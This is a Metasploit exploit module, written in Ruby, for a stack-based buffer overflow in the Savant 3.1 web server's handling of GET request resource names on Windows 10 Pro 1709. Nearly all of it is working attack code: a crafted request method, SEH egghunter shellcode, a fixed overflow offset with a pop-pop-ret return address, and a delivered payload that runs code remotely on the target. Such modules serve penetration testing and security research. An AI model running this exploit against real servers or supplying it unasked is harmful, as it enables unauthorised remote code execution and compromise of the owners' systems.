##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Savant 3.1 GET Buffer Overflow',
      'Description'    => %q{
        This module exploits a stack-based buffer overflow vulnerability
        in the Savant web server 3.1 caused by improper bounds checking of the requested
        resource name. This module has been tested successfully on Windows 10 Pro 1709.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Werebug',
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread'
        },
      'Platform'       => 'win',
      'Payload'        =>
        {
          'BadChars'   => "\x00\x0a\x25",
        },
      'Targets'        =>
        [
          [ 'Windows 10 Pro 1709',
            {
              'Offset' => 253,
              'Ret'    => 0x00418674, # pop pop ret in libspp.dll
            }
          ],
        ],
      'DefaultTarget'  => 0))
      
      register_options(
        [
          Opt::RPORT(80)
        ], self)
  end

  def exploit
    
    method = "\x31\xc0" # xor eax,eax
    method << "\x85\xc0" # test eax,eax
    method << "\x0f\x84\x1a" # jz +32
  
    egghunter = "\xeb\x2a\x59\xb8\x57\x45\x52\x45\x51\x6a\xff\x31\xdb\x64\x89\x23"
    egghunter << "\x83\xe9\x04\x83\xc3\x04\x64\x89\x0b\x6a\x02\x59\x89\xdf\xf3\xaf"
    egghunter << "\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb\xed\xe8\xd1\xff\xff"
    egghunter << "\xff\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8\x83\x04\x08\x06\x58\x83\xc4"
    egghunter << "\x10\x50\x31\xc0\xc3"
  
    crash_input = "\x90" * 16
    crash_input << egghunter
    crash_input << "\x41" * (target['Offset'] - crash_input.length)
    crash_input << [target['Ret']].pack('V')
    
    shellcode = "WEREWERE"
    shellcode << payload.raw
    
    evil_buffer = "#{method} /#{crash_input}\r\n\r\n#{shellcode}"

    connect
    sock.put(evil_buffer)
    disconnect
  end
end
